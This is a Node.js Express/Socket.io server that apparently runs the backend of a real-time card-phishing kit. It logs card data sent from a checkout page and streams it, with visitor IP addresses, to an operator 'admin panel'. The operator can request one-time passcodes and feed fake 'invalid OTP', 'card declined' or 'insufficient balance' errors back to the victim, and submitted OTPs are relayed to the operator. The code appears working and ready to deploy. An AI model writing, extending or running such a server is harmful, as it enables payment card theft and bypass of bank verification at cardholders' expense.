import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import pathToRegexp from 'path-to-regexp';
import { match } from 'path-to-regexp';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);

// Configure CORS for Socket.io based on environment
const corsOptions = {
  origin: process.env.NODE_ENV === 'production' 
    ? true // Allow all origins in production (Render.com handles HTTPS)
    : [
        "http://localhost:5173",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://localhost:8081"
      ],
  methods: ["GET", "POST"],
  credentials: true
};

const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling']
});

// Serve static files from the dist directory in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  // Handle React routing - serve index.html for all non-API routes
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

// Store active visitors
const activeVisitors = new Map();

// Clean up inactive visitors periodically (5 min timeout)
setInterval(() => {
  const now = new Date();
  const timeout = 5 * 60 * 1000; // 5 minutes
  activeVisitors.forEach((visitor, socketId) => {
    const lastActivity = new Date(visitor.lastActivity);
    if (now - lastActivity > timeout) {
      io.emit('visitor-left', { ipAddress: visitor.ipAddress });
      activeVisitors.delete(socketId);
    }
  });
}, 60000); // Check every minute

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  // Handle payment data from checkout page
  socket.on('payment-data', (data) => {
    console.log('Payment data received:', data);
    // Emit to admin panel (broadcast to all connected clients)
    socket.broadcast.emit('payment-received', data);
  });

  // Handle visitor tracking with enhanced heartbeat mechanism
  socket.on('visitor-joined', (data) => {
    console.log('Visitor joined:', data);
    // Store visitor data with socket ID for tracking
    socket.visitorData = {
      ...data,
      socketId: socket.id,
      lastActivity: new Date().toISOString(),
      timestamp: new Date().toISOString()
    };
    activeVisitors.set(socket.id, socket.visitorData);
    // Emit to admin panel (broadcast to all connected clients including sender)
    io.emit('visitor-joined', socket.visitorData);
  });

  socket.on('visitor-heartbeat', (data) => {
    // Update visitor activity timestamp
    if (socket.visitorData) {
      socket.visitorData.lastActivity = new Date().toISOString();
      socket.visitorData.timestamp = new Date().toISOString();
      activeVisitors.set(socket.id, socket.visitorData);
      // Emit to all clients to keep admin panel in sync
      io.emit('visitor-heartbeat-update', socket.visitorData);
    }
  });

  socket.on('visitor-left', (data) => {
    console.log('Visitor left:', data);
    // Remove from active visitors
    if (socket.visitorData) {
      activeVisitors.delete(socket.id);
    }
    // Emit to all clients
    io.emit('visitor-left', data);
    // Clear visitor data
    socket.visitorData = null;
  });

  // Handle admin actions
  socket.on('show-otp', (data) => {
    console.log('Admin requested OTP:', data);
    socket.broadcast.emit('show-otp', data);
  });

  socket.on('payment-approved', (data) => {
    console.log('Admin approved payment:', data);
    console.log('Broadcasting payment-approved to all clients');
    socket.broadcast.emit('payment-approved', data);
  });

  socket.on('reject-payment', (data) => {
    console.log('Admin rejected payment:', data);
    socket.broadcast.emit('payment-rejected', data);
  });

  // New admin actions for enhanced OTP flow
  socket.on('invalid-otp-error', (data) => {
    console.log('Admin marked OTP as invalid', data);
    socket.broadcast.emit('invalid-otp-error', data);
  });

  socket.on('card-declined-error', (data) => {
    console.log('Admin declined card', data);
    socket.broadcast.emit('card-declined-error', data);
  });

  socket.on('insufficient-balance-error', (data) => {
    console.log('Admin marked insufficient balance', data);
    socket.broadcast.emit('insufficient-balance-error', data);
  });

  // Handle OTP submission
  socket.on('otp-submitted', (data) => {
    console.log('OTP submitted:', data);
    socket.broadcast.emit('otp-submitted', data);
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
    // If visitor was tracked, remove from activeVisitors and emit visitor left event
    if (socket.visitorData) {
      io.emit('visitor-left', { ipAddress: socket.visitorData.ipAddress });
      activeVisitors.delete(socket.id);
      socket.visitorData = null;
    }
  });
});

// Health check endpoint for Render.com
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3001;

// Error handling for server startup
server.on('error', (error) => {
  console.error('Server error:', error);
  process.exit(1);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log('Node.js version:', process.version);
});
